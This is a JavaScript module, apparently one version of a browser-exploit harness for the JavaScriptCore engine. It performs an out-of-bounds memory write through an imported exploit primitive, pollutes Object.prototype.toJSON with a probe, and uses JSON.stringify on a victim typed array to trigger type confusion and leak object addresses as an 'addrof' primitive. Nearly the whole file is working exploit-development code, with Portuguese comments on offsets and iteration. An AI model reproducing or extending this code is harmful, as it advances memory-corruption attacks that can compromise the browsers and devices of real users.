// js/script3/testArrayBufferVictimCrash.mjs (v53_FocusDirectABLeak)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL = "OriginalHeisenbug_TypedArrayAddrof_v53_FocusDirectABLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C; // Offset crítico conhecido
// Valor OOB ligeiramente alterado para v53, na tentativa de variar o estado pós-type-confusion
const OOB_WRITE_VALUE_V53 = 0xFEFEFEFE; // v52 usava 0xFFFFFFFF

let object_to_leak_A_v53 = null;
let object_to_leak_B_v53 = null;

let victim_typed_array_ref_v53 = null;
let probe_call_count_v53 = 0;
let all_probe_interaction_details_v53 = [];
let first_call_details_object_ref_v53 = null;

const PROBE_CALL_LIMIT_V53 = 10;

function toJSON_TA_Probe_FocusDirectABLeak() {
    probe_call_count_v53++;
    const call_num = probe_call_count_v53;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v53_FocusDirectABLeak",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v53),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v53 && first_call_details_object_ref_v53 !== null),
        payload_A_assigned: false,
        payload_B_assigned: false,
        error_in_probe: null,
        addrof_result_from_this: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V53) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v53.push(current_call_details);
            return { recursion_stopped_v53: true, call: call_num };
        }

        // Caso 1: 'this' é a vítima original (primeira chamada)
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating and returning C1_details object.`, "info");
            first_call_details_object_ref_v53 = current_call_details;
            try {
                first_call_details_object_ref_v53.early_payload_A = object_to_leak_A_v53;
                first_call_details_object_ref_v53.early_payload_B = object_to_leak_B_v53;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Attempted early payload assignment to C1_details.`, "info");
            } catch (e) {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Error during early payload assignment: ${e.message}`, "warn");
            }
            all_probe_interaction_details_v53.push(current_call_details);
            return current_call_details;
        }
        // Caso 2: 'this' é um [object Object] (espera-se que seja o C1_details confuso ou um objeto genérico)
        else if (current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION DETECTED for 'this'! (IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}) Attempting leak...`, "vuln");
            if (object_to_leak_A_v53) {
                this.payload_A = object_to_leak_A_v53; // Pode causar circularidade, como em v52
                current_call_details.payload_A_assigned = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned object_to_leak_A_v53 to this.payload_A.`, "info");
            }
            if (object_to_leak_B_v53) {
                this.payload_B = object_to_leak_B_v53; // Pode causar circularidade
                current_call_details.payload_B_assigned = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned object_to_leak_B_v53 to this.payload_B.`, "info");
            }
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' modified. Keys: ${Object.keys(this).join(',')}`, "info");
            all_probe_interaction_details_v53.push(current_call_details);
            return this; // Retornar o 'this' modificado.
        }
        // Caso 3: 'this' é um ArrayBuffer ou DataView ou TypedArray (FOCO DESTA VERSÃO V53)
        else if (current_call_details.this_type === '[object ArrayBuffer]' || current_call_details.this_type === '[object DataView]' ||
                 current_call_details.this_type.includes('Array')) { // Inclui TypedArrays genéricas
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: V53 TARGET HIT - 'this' is an INJECTED TYPEDARRAY/ARRAYBUFFER! Attempting to extract pointer! Type: ${current_call_details.this_type}`, "critical");
            let leaked_val = null;
            let view_to_read_from;
            // Usar um offset conhecido para ponteiro de dados internos. Ex: 0x10 (butterfly/vector ptr) ou 0x08 (ArrayBufferView backing store)
            // JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET é geralmente 0x10 para o ponteiro de dados do ArrayBuffer.
            const offset_to_read = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET;

            try {
                if (current_call_details.this_type === '[object ArrayBuffer]') {
                    view_to_read_from = new DataView(this);
                } else if (this.buffer instanceof ArrayBuffer) { // É uma TypedArray ou DataView
                    view_to_read_from = new DataView(this.buffer, this.byteOffset, this.byteLength);
                } else {
                    throw new Error("Cannot create DataView from this object for pointer extraction.");
                }

                if (view_to_read_from.byteLength < (offset_to_read + 8)) {
                    throw new RangeError(`Target object too small (${view_to_read_from.byteLength} bytes) to read 8 bytes from offset ${toHex(offset_to_read)}.`);
                }

                let low = view_to_read_from.getUint32(offset_to_read, true);
                let high = view_to_read_from.getUint32(offset_to_read + 4, true);
                let int64_val = new AdvancedInt64(low, high);

                // Converter para Float64 para serialização JSON, já que BigInt não é padrão.
                let temp_buffer_for_float_conversion = new ArrayBuffer(8);
                let temp_float64_view_conversion = new Float64Array(temp_buffer_for_float_conversion);
                let temp_uint32_view_conversion = new Uint32Array(temp_buffer_for_float_conversion);
                temp_uint32_view_conversion[0] = int64_val.low();
                temp_uint32_view_conversion[1] = int64_val.high();
                leaked_val = temp_float64_view_conversion[0];

                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Read from 'this' (${current_call_details.this_type}) at offset ${toHex(offset_to_read)}. Leaked raw value: ${int64_val.toString(true)} (as double: ${leaked_val})`, "vuln");
                current_call_details.addrof_result_from_this = leaked_val;
                all_probe_interaction_details_v53.push(current_call_details);
                // Retornar um objeto simples que pode ser serializado facilmente
                return { leaked_address_v53: leaked_val, leaked_obj_type: current_call_details.this_type, from_offset: toHex(offset_to_read), method: "OffsetRead_Success_V53" };

            } catch (e_leak) {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR during pointer extraction from 'this' (${current_call_details.this_type}): ${e_leak.name} - ${e_leak.message}`, "error");
                current_call_details.error_in_probe = e_leak.message;
                all_probe_interaction_details_v53.push(current_call_details);
                return { addrof_error_v53: e_leak.message, type: current_call_details.this_type, method: "OffsetRead_Failed_V53" };
            }
        }
        // Caso 4: Outras chamadas
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected. Type: ${current_call_details.this_type}`, "warn");
            all_probe_interaction_details_v53.push(current_call_details);
            return { generic_marker_v53: call_num };
        }

    } catch (e) {
        current_call_details.error_in_probe = e.message;
        const FNAME_CURRENT_TEST_REF = FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL; // Referência para o log
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: CRITICAL ERROR in probe: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST_REF);
        all_probe_interaction_details_v53.push(current_call_details);
        return { error_marker_v53: call_num };
    }
}

export async function executeTypedArrayVictimAddrofTest_FocusDirectABLeak() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (FocusDirectABLeak) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL} Init...`;

    probe_call_count_v53 = 0;
    all_probe_interaction_details_v53 = [];
    victim_typed_array_ref_v53 = null;
    first_call_details_object_ref_v53 = null;

    object_to_leak_A_v53 = { marker_A_v53: "LeakMeA_FDAL", idA: Date.now() };
    object_to_leak_B_v53 = { marker_B_v53: "LeakMeB_FDAL", idB: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let rawStringifyOutput = null;
    let stringifyOutput_parsed = null;

    let addrof_A_result = { success: false, msg: "Addrof A: Default (v53)" };
    let addrof_B_result = { success: false, msg: "Addrof B: Default (v53)" }; // Manter para consistência, embora o foco seja A.
    const fillPattern = 0.53535353535353; // Padrão ligeiramente diferente para v53

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        // Usando OOB_WRITE_VALUE_V53
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE_V53, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE_V53)} (v53 variant).`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v53 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v53.buffer);
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v53 (Uint8Array) created. Its buffer filled.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_FocusDirectABLeak, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted with v53 probe. Calling JSON.stringify(victim_typed_array_ref_v53)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v53);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Expected if circular or non-std JSON. Output: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            let heisenbugConfirmedOnObject = false;
            const relevantConfusedObjectCall = all_probe_interaction_details_v53.find(d => d.this_type === '[object Object]' && d.payload_A_assigned);
            if (relevantConfusedObjectCall) {
                heisenbugConfirmedOnObject = true;
                logS3(`  EXECUTE: TYPE CONFUSION to [object Object] & PAYLOAD ASSIGNMENT on Call #${relevantConfusedObjectCall.call_number} CONFIRMED!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: Type confusion to [object Object] with payload assignment NOT confirmed.`, "warn", FNAME_CURRENT_TEST);
            }

            logS3("STEP 3: Checking stringifyOutput_parsed for leaked payloads (v53 FocusDirectABLeak)...", "warn", FNAME_CURRENT_TEST);

            // PRIORIDADE V53: Verificar se a sonda (Caso 3) retornou um ponteiro diretamente
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.leaked_address_v53 !== undefined) {
                const leaked_addr_val = stringifyOutput_parsed.leaked_address_v53;
                logS3(`  V53_TARGET_ANALYSIS: Found 'leaked_address_v53' in output. Type: ${stringifyOutput_parsed.leaked_obj_type}, Method: ${stringifyOutput_parsed.method}`, "good");
                if (typeof leaked_addr_val === 'number' && !isNaN(leaked_addr_val) && leaked_addr_val !== 0) {
                    let p_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[0], new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[1]);
                    // Lógica de validação de ponteiro (pode precisar de ajuste)
                    if (p_int64.high() > 0x1000 || (p_int64.high() === 0 && p_int64.low() === 0)) { // Exemplo: alta > 4KB ou nulo
                         // Ajuste a validação para o que é esperado como ponteiro válido.
                        addrof_A_result.success = true; addrof_A_result.msg = `V53 SUCCESS (Direct AB Leak): Pointer from leaked_address_v53: ${p_int64.toString(true)} (type: ${stringifyOutput_parsed.leaked_obj_type}, method: ${stringifyOutput_parsed.method})`;
                    } else { addrof_A_result.msg = `V53 DirectABLeak is num but not ptr pattern: ${p_int64.toString(true)}`; }
                } else { addrof_A_result.msg = `V53 DirectABLeak value not a useful number: ${JSON.stringify(leaked_addr_val)}`; }
            }
            // Secundário: verificar se o stringifyOutput é o C1_details modificado (Caso 2 da sonda)
            else if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.payload_A !== undefined) {
                logS3(`  V53_FALLBACK_ANALYSIS: Checking C1_details-like object for payload_A.`, "info");
                const payload_A_val = stringifyOutput_parsed.payload_A;
                if (typeof payload_A_val === 'number' && !isNaN(payload_A_val) && payload_A_val !== 0) {
                    let pA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_A_val]).buffer)[0], new Uint32Array(new Float64Array([payload_A_val]).buffer)[1]);
                    if (pA_int64.high() > 0x1000 || (pA_int64.high() === 0 && pA_int64.low() === 0)) { // Exemplo
                        addrof_A_result.success = true; addrof_A_result.msg = `V53 SUCCESS (C1.payload_A): Possible pointer for A: ${pA_int64.toString(true)}`;
                    } else { addrof_A_result.msg = `V53 C1.payload_A is num but not ptr: ${pA_int64.toString(true)}`; }
                } else if (payload_A_val && payload_A_val.marker_A_v53 === object_to_leak_A_v53.marker_A_v53) {
                    addrof_A_result.msg = `V53 C1.payload_A is object_to_leak_A_v53 directly (not numeric pointer). Circularity likely occurred.`;
                } else { addrof_A_result.msg = `V53 C1.payload_A not a useful number or object: ${JSON.stringify(payload_A_val)}`; }

                // Checagem para payload_B (similar, mas addrof_B_result)
                const payload_B_val = stringifyOutput_parsed.payload_B;
                 if (typeof payload_B_val === 'number' && !isNaN(payload_B_val) && payload_B_val !== 0) {
                    let pB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_B_val]).buffer)[0], new Uint32Array(new Float64Array([payload_B_val]).buffer)[1]);
                     if (pB_int64.high() > 0x1000 || (pB_int64.high() === 0 && pB_int64.low() === 0)) {
                        addrof_B_result.success = true; addrof_B_result.msg = `V53 SUCCESS (C1.payload_B): Possible pointer for B: ${pB_int64.toString(true)}`;
                    } else { addrof_B_result.msg = `V53 C1.payload_B is num but not ptr: ${pB_int64.toString(true)}`; }
                } else if (payload_B_val && payload_B_val.marker_B_v53 === object_to_leak_B_v53.marker_B_v53) {
                    addrof_B_result.msg = `V53 C1.payload_B is object_to_leak_B_v53 directly.`;
                } else { addrof_B_result.msg = `V53 C1.payload_B not a useful number or object: ${JSON.stringify(payload_B_val)}`; }

            } else if (stringifyOutput_parsed && stringifyOutput_parsed.parse_error && rawStringifyOutput.includes("circular structure")) {
                addrof_A_result.msg = "V53 Raw stringify output had 'circular structure' error. Objects assigned, not serialized as numbers.";
                addrof_B_result.msg = "V53 Raw stringify output had 'circular structure' error.";
                logS3(`  V53 Raw stringify output indicates circular structure. This is a good sign for control, but not a direct numeric leak via this path.`, "info");
            } else {
                addrof_A_result.msg = "V53 stringifyOutput_parsed was not an object, null, or did not contain expected payloads.";
                addrof_B_result.msg = "V53 stringifyOutput_parsed was not an object, null, or did not contain expected payloads.";
                logS3(`  V53 stringifyOutput_parsed type: ${typeof stringifyOutput_parsed}, content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn");
            }

            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL}: Addr SUCCESS!`;
            } else if (heisenbugConfirmedOnObject || (stringifyOutput_parsed && stringifyOutput_parsed.parse_error && rawStringifyOutput.includes("circular structure"))) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL}: Heisenbug OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL}: No Heisenbug?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n'+e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v53}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v53 = null;
        all_probe_interaction_details_v53 = [];
        probe_call_count_v53 = 0;
        first_call_details_object_ref_v53 = null;
        object_to_leak_A_v53 = null;
        object_to_leak_B_v53 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', // Exemplo de indicador de crash
        stringifyResult: stringifyOutput_parsed,
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v53],
        total_probe_calls: probe_call_count_v53,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
};
